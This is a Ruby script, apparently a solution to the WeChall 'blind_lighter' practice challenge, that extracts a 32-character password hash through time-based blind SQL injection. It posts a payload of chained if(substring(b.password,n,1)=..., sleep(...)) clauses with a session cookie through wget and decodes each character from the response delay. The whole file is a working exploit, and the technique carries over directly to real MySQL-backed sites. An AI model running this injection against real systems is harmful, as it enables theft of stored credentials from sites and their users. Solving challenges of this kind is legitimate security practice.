require 'open-uri'

#CHANGE
$cookie = "WC=randomcharsandstuff"



url = "http://www.wechall.net/challenge/blind_lighter/index.php"
$hash = ""
$time_taken = 0.0
base_sleep_time = 3

char_set = ['A', 'B', 'C', 'D', 'E', 'F', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']

#This method gets the result back from the server
def wget(url, post_data)
	wget = "wget -O - -q #{url} " \
	"--header=\"Referer: http://www.wechall.net/challenge/blind_lighter/index.php\" " \
	"--header=\"Cookie: WC=#{$cookie}\" " \
	"--post-data \"injection=#{post_data}&inject=Inject\""
	#register the time before the request
	start = Time.now
	#send the request to the server
	grep = `#{wget}`
	#stop the time after the request
	finish = Time.now
	#calculate the differance (the time taken)
	$time_taken = finish - start
	#return the result of the query
	return grep
end


for n in 1..32
	#Building the SQLi query
	#The query asks the server to wait a multiple of the variable (base_sleep_time)
	#based on the char
	post_data = "kk' or ''='' and ( " \
				"if(substring(b.password,#{n},1)='#{char_set[0]}', sleep(#{base_sleep_time}), 1) and " \
				"if(substring(b.password,#{n},1)='#{char_set[1]}', sleep(#{base_sleep_time*2}), 1) and " \
				"if(substring(b.password,#{n},1)='#{char_set[2]}', sleep(#{base_sleep_time*3}), 1) and " \
				"if(substring(b.password,#{n},1)='#{char_set[3]}', sleep(#{base_sleep_time*4}), 1) and " \
				"if(substring(b.password,#{n},1)='#{char_set[4]}', sleep(#{base_sleep_time*5}), 1) and " \
				"if(substring(b.password,#{n},1)='#{char_set[5]}', sleep(#{base_sleep_time*6}), 1) and " \
				"if(substring(b.password,#{n},1)='#{char_set[6]}', sleep(#{base_sleep_time*7}), 1) and " \
				"if(substring(b.password,#{n},1)='#{char_set[7]}', sleep(#{base_sleep_time*8}), 1) and " \
				"if(substring(b.password,#{n},1)='#{char_set[8]}', sleep(#{base_sleep_time*9}), 1) and " \
				"if(substring(b.password,#{n},1)='#{char_set[9]}', sleep(#{base_sleep_time*10}), 1) and " \
				"if(substring(b.password,#{n},1)='#{char_set[10]}', sleep(#{base_sleep_time*11}), 1) and " \
				"if(substring(b.password,#{n},1)='#{char_set[11]}', sleep(#{base_sleep_time*12}), 1) and " \
				"if(substring(b.password,#{n},1)='#{char_set[12]}', sleep(#{base_sleep_time*13}), 1) and " \
				"if(substring(b.password,#{n},1)='#{char_set[13]}', sleep(#{base_sleep_time*14}), 1) and " \
				"if(substring(b.password,#{n},1)='#{char_set[14]}', sleep(#{base_sleep_time*15}), 1) and " \
				"if(substring(b.password,#{n},1)='#{char_set[15]}', sleep(#{base_sleep_time*16}), 1));-- -"
	#send the request to the server
	grep = wget(url, URI::encode(post_data))
	#Calculating the index. Since the wait time is multipl of (base_sleep_time), we divid
	#by (base_sleep_time)
	i = $time_taken.floor/base_sleep_time
	#print the char we found
	puts "The char number #{n} is #{char_set[i-1]}"
	#append the char to the hash
	$hash = $hash + char_set[i-1].to_s
	#sleep for 2 seconds before sending another request
	sleep(2)
	
end

puts "Number of attempts were: 32" #always
puts "The hash is #{$hash}"

